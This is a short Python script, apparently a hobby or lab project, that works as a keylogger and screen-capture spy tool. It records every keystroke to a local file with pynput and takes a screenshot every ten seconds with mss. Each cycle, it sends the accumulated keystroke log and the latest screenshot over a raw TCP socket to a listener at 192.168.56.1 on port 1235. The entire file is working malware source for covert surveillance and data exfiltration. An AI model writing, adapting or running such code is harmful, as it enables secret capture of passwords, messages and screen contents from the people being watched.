from pynput import keyboard
import mss
import time
import os
import socket
import struct

log_file = "log_file.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            if key == keyboard.Key.ctrl_l:
                file.write(f" Left Ctrl ")
            elif key == keyboard.Key.ctrl_r:
                file.write(f" Right Ctrl ")
            elif key == keyboard.Key.alt_l:
                file.write(f" Left Alt ")
            elif key == keyboard.Key.alt_gr:
                file.write(f" Right Alt ")
            elif key == keyboard.Key.shift_l:
                file.write(f" Left Shift ")
            elif key == keyboard.Key.shift_r:
                file.write(f" Right Shift ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write(f" Backspace ")
            elif key == keyboard.Key.tab:
                file.write("    ")
            elif key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.delete:
                file.write(" Delete ")
            else:
                file.write(f" {key} ")

listner = keyboard.Listener(on_press=on_press)
listner.start()

s_dir = "key_logger/screenshots"

os.makedirs(s_dir, exist_ok=True)

count = 1

server_address = ("192.168.56.1", 1235)

print(f"Connecting to {server_address}")

with mss.mss() as screen_shot:
    while True:
        sock = None
        try:
            s_shot_name = f"{s_dir}/screenshot{str(count)}.png"
            screen_shot.shot(output=s_shot_name)
            print(f"screen_shot {s_shot_name} captured and saved successfully.")
            count += 1

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(server_address)
            
            with open(log_file, "r", encoding="utf-8") as f:
                text_content = f.read()
            message_byte = text_content.encode('utf-8')

            text_file_size = len(message_byte)
            text_header = struct.pack("!I", text_file_size)
            sock.sendall(text_header)
            sock.sendall(message_byte)
            
            with open(s_shot_name, "rb") as file:
                message = file.read()
            file_size = len(message)
            header = struct.pack("!I", file_size)

            sock.sendall(header)
            sock.sendall(message)

            sock.shutdown(socket.SHUT_WR)
            sock.close()
            print("File send and program is in sleep mode for 10 seconds.")
            time.sleep(10)
        except Exception as e:
            print("Error:",e)



